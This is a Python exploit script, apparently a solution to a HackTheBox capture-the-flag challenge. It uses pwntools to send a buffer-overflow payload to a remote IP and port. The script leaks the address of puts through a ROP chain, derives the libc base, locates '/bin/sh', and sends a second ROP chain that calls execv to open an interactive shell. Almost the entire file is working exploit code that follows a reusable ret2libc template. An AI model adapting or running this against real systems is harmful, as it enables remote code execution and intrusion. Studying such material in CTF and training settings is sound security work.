import ipaddress
import pathlib
from loguru import logger

from core.target_config import Config, Mode
from core.targetbase import TargetBase
from pwn import p64, u64

from modules.find_function import FindFunction, Method
from modules.get_libc_address import GetLibcAddress

if __name__ == '__main__':
    remote_config = Config(
        rop=True,
        mode=Mode.remote,
        ip=ipaddress.IPv4Address('159.65.86.238'),
        port=32083,
        file=pathlib.Path('/home/lim8en1/htb/ctf/pand/challenge/pb'),
        offset=0x38,
        libc='libc6_2.35-0ubuntu3.1_amd64'
    )
    t = TargetBase(config=remote_config)
    # _, debugger = gdb.attach(t.process.pid, api=True)
    # debugger.execute('break execv')
    # debugger.execute('c')

    address = t.file.symbols['main']
    pop_rdi = t.rop.find_gadget(['pop rdi', 'ret']).address + t.base_address_fix

    result = FindFunction.execute(t, 'puts', Method.PLT)
    if not result:
        logger.critical(f"Failed to get a print function")
        exit(0)
    print_function_name, print_function_address = result
    result = FindFunction.execute(t, 'puts', Method.GOT)
    if not result:
        logger.critical(f"Failed to get a print function")
        exit(0)
    target_function_name, target_function_address = result

    rop_chain = (
            p64(pop_rdi) +
            p64(target_function_address) +
            p64(print_function_address) +
            p64(address)
    )
    payload = t.create_payload(rop_chain)
    t.process.sendline(b'2')
    t.process.clean(0.3)
    t.process.sendline(payload)
    t.process.recvline()
    t.process.recvline()
    t.process.recvline()
    data = t.process.recvline()[:-1]
    if len(data) > 8:
        logger.critical("Unexpected number of bytes received")
        exit(0)
    puts_address = u64(data.ljust(8, b'\0'))

    logger.info(f"Leaked libc address: puts@{hex(puts_address)}")
    GetLibcAddress.libc_update_base_address(t, [('puts', puts_address)])
    sh_address = next(t.libc.search(b'/bin/sh\0'))
    logger.success(f"/bin/sh address: {hex(sh_address)}")

    pop_rsi = t.rop.find_gadget(['pop rsi', 'pop r15', 'ret']).address + t.base_address_fix
    sh_address = next(t.libc.search(b'/bin/sh\0'))
    logger.success(f"/bin/sh address: {hex(sh_address)}")
    execv_address = t.libc.symbols['execv']
    logger.success(f"Using execv@{hex(execv_address)}")

    rop_chain = (
            p64(pop_rdi) +
            p64(sh_address) +
            p64(pop_rsi) +
            p64(0x0) +
            p64(0x0) +
            p64(execv_address)
    )
    payload = t.create_payload(rop_chain)

    t.process.sendline(b'2')
    t.process.clean(0.3)
    t.process.sendline(payload)
    t.process.interactive()
    pass

    # address = t.file.symbols['escape_plan']
    # payload = b'A' * 0x38 + p64(address)
    # t.process.interactive()

